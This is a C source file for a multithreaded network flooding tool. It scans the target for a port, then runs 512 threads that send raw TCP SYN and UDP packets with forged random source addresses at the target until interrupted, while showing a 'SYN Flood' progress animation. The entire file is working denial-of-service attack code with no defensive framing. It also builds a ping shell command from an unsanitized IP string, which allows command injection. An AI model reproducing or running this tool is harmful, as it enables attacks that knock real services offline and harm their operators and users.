#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <linux/tcp.h>
#include <netinet/in.h>
#include <signal.h>//--
#include <netinet/udp.h>  // struct udphdr  

#include "ascii.h"
#include "terminal.h"
#include "portscanner.h"

#define PACKET_SIZE  4096
#define THREAD_COUNT 512

//golobal
int row;
int port_select;
                                                                                                                                    
extern pthread_mutex_t ekran_mutex;

volatile sig_atomic_t stop_flag = 0;

pthread_t threads[THREAD_COUNT];
pthread_t animasyon_thread;

// Pseudo-header for TCP checksum calculation
struct pseudo_header {
    uint32_t source_address;
    uint32_t dest_address;
    uint8_t  placeholder;
    uint8_t  protocol;
    uint16_t tcp_length;
};

typedef struct {
    const char *target_ip;
    int thread_count;
} AnimationArgs;

// Signal handler for Ctrl+C
void sigint_handler(int sig) {
    (void)sig;    
    stop_flag = 1;
    printf("\033[%d;1H", row); 
    printf("\033[J");
}

// Compute checksum (for IP and TCP)
static unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((uint8_t *)&oddbyte) = *(uint8_t *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)(~sum);
    return answer;
}

int is_target_online(const char *ip) {
    char command[100];
    // -c 1: 1 paket gönder, -W 1: timeout 1 saniye (Linux için)
    snprintf(command, sizeof(command), "ping -c 1 -W 1 %s > /dev/null 2>&1", ip);
    
    int status = system(command);
    
    // system() 0 dönerse ping başarılı olmuştur
    return (status == 0);
}

// Thread function: continuously send SYN packets to target IP
static void *flood(void *arg) 
{
    const char *target_ip = (const char *)arg;
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port_select);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    // TCP socket
    int sock_tcp = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock_tcp < 0) {
        perror("TCP socket oluşturulamadı");
        pthread_exit(NULL);
    }

    int one = 1;
    if (setsockopt(sock_tcp, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt TCP");
        close(sock_tcp);
        pthread_exit(NULL);
    }

    // UDP socket
    int sock_udp = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sock_udp < 0) {
        perror("UDP socket oluşturulamadı");
        close(sock_tcp);
        pthread_exit(NULL);
    }

    if (setsockopt(sock_udp, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt UDP");
        close(sock_tcp);
        close(sock_udp);
        pthread_exit(NULL);
    }

    char datagram[PACKET_SIZE];

    while (!stop_flag) {
        if (stop_flag) break;

        //             -------------------- TCP --------------------
        memset(datagram, 0, PACKET_SIZE);
        struct iphdr *iph = (struct iphdr *)datagram;
        struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));

        // IP header TCP için
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htons(rand() % 65535); // random port
        iph->ttl = 255;
        iph->protocol = IPPROTO_TCP;

        uint8_t ip_parts_tcp[4] = { rand() % 256, rand() % 256, rand() % 256, rand() % 256 };
        char ip_str_tcp[16];
        sprintf(ip_str_tcp, "%d.%d.%d.%d", ip_parts_tcp[0], ip_parts_tcp[1], ip_parts_tcp[2], ip_parts_tcp[3]);
        iph->saddr = inet_addr(ip_str_tcp);
        iph->daddr = sin.sin_addr.s_addr;

        iph->check = 0;
        iph->check = checksum((unsigned short *)datagram, ntohs(iph->tot_len));

        // TCP header
        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(port_select);
        tcph->seq = rand();
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(32767 + rand() % (65536 - 32767));
        tcph->check = 0;
        tcph->urg_ptr = 0;

        struct pseudo_header psh_tcp;
        psh_tcp.source_address = iph->saddr;
        psh_tcp.dest_address = iph->daddr;
        psh_tcp.placeholder = 0;
        psh_tcp.protocol = IPPROTO_TCP;
        psh_tcp.tcp_length = htons(sizeof(struct tcphdr));

        int psize_tcp = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
        char *pseudogram_tcp = malloc(psize_tcp);
        memcpy(pseudogram_tcp, &psh_tcp, sizeof(struct pseudo_header));
        memcpy(pseudogram_tcp + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        tcph->check = checksum((unsigned short *)pseudogram_tcp, psize_tcp);
        free(pseudogram_tcp);

        sendto(sock_tcp, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));


        //             -------------------- UDP --------------------
        memset(datagram, 0, PACKET_SIZE);
        iph = (struct iphdr *)datagram;
        struct udphdr *udph = (struct udphdr *)(datagram + sizeof(struct iphdr));

        // Rastgele payload uzunluğu belirle (32-512 byte)
        int payload_len = (rand() % 480) + 32; 
        char *payload = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);

        // Rastgele içerik oluştur
        for (int i = 0; i < payload_len; i++) {
            payload[i] = (char)(rand() % 256); // 0-255 arası byte
        }

        // IP header (UDP için)
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + payload_len);
        iph->id = htons(rand() % 65535);
        iph->ttl = 255;
        iph->protocol = IPPROTO_UDP;

        uint8_t ip_parts_udp[4] = { rand() % 256, rand() % 256, rand() % 256, rand() % 256 };
        char ip_str_udp[16];
        sprintf(ip_str_udp, "%d.%d.%d.%d", ip_parts_udp[0], ip_parts_udp[1], ip_parts_udp[2], ip_parts_udp[3]);
        iph->saddr = inet_addr(ip_str_udp);
        iph->daddr = sin.sin_addr.s_addr;

        // IP checksum
        iph->check = 0;
        iph->check = checksum((unsigned short *)datagram, ntohs(iph->tot_len));

        // UDP header
        udph->source = htons(rand() % 65535);
        udph->dest = htons(port_select);
        udph->len = htons(sizeof(struct udphdr) + payload_len);
        udph->check = 0;

        // UDP checksum için pseudo header
        struct pseudo_header psh_udp;
        psh_udp.source_address = iph->saddr;
        psh_udp.dest_address = iph->daddr;
        psh_udp.placeholder = 0;
        psh_udp.protocol = IPPROTO_UDP;
        psh_udp.tcp_length = htons(sizeof(struct udphdr) + payload_len);

        int psize_udp = sizeof(struct pseudo_header) + sizeof(struct udphdr) + payload_len;
        char *pseudogram_udp = malloc(psize_udp);
        memcpy(pseudogram_udp, &psh_udp, sizeof(struct pseudo_header));
        memcpy(pseudogram_udp + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + payload_len);
        udph->check = checksum((unsigned short *)pseudogram_udp, psize_udp);
        free(pseudogram_udp);

        // Paketi gönder
        sendto(sock_udp, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));

    }

    close(sock_tcp);
    close(sock_udp);
    pthread_exit(NULL);
}


void *flood_animation(void *arg)
{
    const char *target_ip = (const char *)arg; // burayı ekle
    int cerceve_sayisi = 4;
    struct timespec bekleme = {0, 600000000}; // 600ms
    const char *dots[] = {".  ", ".. ", "...", "...."};

    while (!stop_flag) 
    {
        for (int i = 0; i < cerceve_sayisi; i++) 
        {
            if (stop_flag) break;

            pthread_mutex_lock(&ekran_mutex);
            row = row_location_function();

            printf("\033[%d;1H", row); 
            printf("\033[J");

            printf("\033[40m\033[1;31m[*] \033[1;34mSYN Flood \033[0m"
                   "\033[40m\033[1;33m%s \033[1;37müzerinde "
                   "\033[40m\033[1;33m%d \033[1;37"
                   "\033[1;32m%d \033[1;37mthread%s\033[0m\n\n",
                    target_ip,port_select, THREAD_COUNT, dots[i]);

            fflush(stdout);

            printf("%s", windows[i]);   
            fflush(stdout);
            nanosleep(&bekleme, NULL);

            pthread_mutex_unlock(&ekran_mutex);
        }
    }

    return NULL;
}

void port_get(const char *target_ip){
    //port scan 
    port_select = portscanner(target_ip);
}
// Starts THREAD_COUNT threads to flood the provided target IP
int SYN_Flood(const char *target_ip) {
    stop_flag = 0;
    port_get(target_ip);
    // Set up signal handler
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigint_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;
    

    if (!is_target_online(target_ip)) {
        fprintf(stderr, "\n\033[49m[!]\033[0m\033[1;31m Target %s is unreachable! (ping failed)\033[0m\n", target_ip);
        return 1;
    }

    if (sigaction(SIGINT, &sa, NULL) == -1) {
        perror("sigaction");
        return 1;
    }

    srand(time(NULL));

    if (pthread_create(&animasyon_thread, NULL, flood_animation, (void *)target_ip) != 0) {
        fprintf(stderr, "Animasyon thread'i oluşturulamadı\n");
        return 1;
    }

    // Create flood threads
    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, flood, (void *)target_ip) != 0) {
            fprintf(stderr, "Thread %d oluşturulamadı\n", i);
        }
    }

    // Wait for all threads to finish
    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }
    pthread_join(animasyon_thread, NULL);
    printf("[-]Thread");
    
    return 0;
}